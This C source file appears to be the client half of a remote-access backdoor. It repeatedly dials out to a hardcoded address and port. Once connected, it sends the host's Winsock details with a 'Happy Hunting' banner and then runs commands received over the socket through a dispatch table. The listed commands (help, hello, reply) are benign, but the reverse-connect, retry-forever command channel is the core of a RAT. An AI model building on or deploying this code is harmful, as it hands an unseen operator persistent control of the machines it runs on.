#include <stdio.h>
#include <string.h>

#include "RemoteCommandExecutor.h"
#include "SocketUtil.h"
#include "Commands.h"

static SOCKET tcpSocket = SOCKET_ERROR;
Command commands[N_COMMANDS] = {
	{ "help",  (CommandProc) HelpCommand, FALSE},
	{ "hello", (CommandProc) HelloCommand, FALSE},
	{ "reply", ReplyCommand, TRUE}
};

static void CommandExecutor(PSTR buffer) {
	BOOL isValidCommand = FALSE;

	char* firstToken = strtok(buffer, " ");

	if(!firstToken) {
		WriteConnection(&tcpSocket, "Internal error occoured\nIgnoring message preventing process crash...\n");
		return;
	}

	for(int i = 0;i < N_COMMANDS; i++) {
		if(!strcmp(firstToken,commands[i].command)) {
			if(commands[i].proc) {
				if(commands[i].proc(&tcpSocket, buffer + strlen(firstToken) + 1) == FALSE)
					WriteConnection(&tcpSocket, "Not enough arguments\n");
			} else
				WriteConnection(&tcpSocket, "Could not execute command!\n");

			isValidCommand = TRUE;
			break;
		}
	}

	if(!isValidCommand)
		WriteConnection(&tcpSocket, "Uh?\n"
				"Invalid command\n"
				"Use \"help\" to get help.\n");
}

#define DST "192.168.2.103"
#define PORT 12345

#define SendInitialInfo(wsad) { \
	char buf[BUFSIZE]; \
	ZeroMemory(buf, BUFSIZE); \
	snprintf(buf, MAX_BUF_IN_OUT, "WSA implementation\n" \
			"Version: %d.%d\n" \
			"Max. sockets: %d\n" \
			"VendorInfo: %s\n" \
			"InternalStatus: %s\n" \
			"^^^Happy Hunting^^^", \
			LOBYTE(wsad.wVersion), HIBYTE(wsad.wVersion), \
			wsad.iMaxSockets, wsad.lpVendorInfo, wsad.szSystemStatus); \
	WriteConnection(&tcpSocket, buf); \
}

void StartCommandExecutorConnection(void) {
	WSADATA internalSocketData;
	if(WSAStartup(MAKEWORD(2,2), &internalSocketData))
		return;

	while(1) { //top-level
		tcpSocket = NewTcpSocket();
		while(!EstablishConnection(&tcpSocket, DST, PORT)) {}
		
		//connection established
		SendInitialInfo(internalSocketData);
		
		//start the command parser
		//it will run til TCP connection is ESTABLISHED
		char commandBuffer[BUFSIZE];
		while(ReadConnection(&tcpSocket, commandBuffer, MAX_BUF_IN_OUT))
			CommandExecutor(commandBuffer);

		//disconnected or error occoured, close socket and get back
		CloseConnection(&tcpSocket);
	}
}

void StopCommandExecutor(void) {
	CloseConnection(&tcpSocket);
	WSACleanup();
}
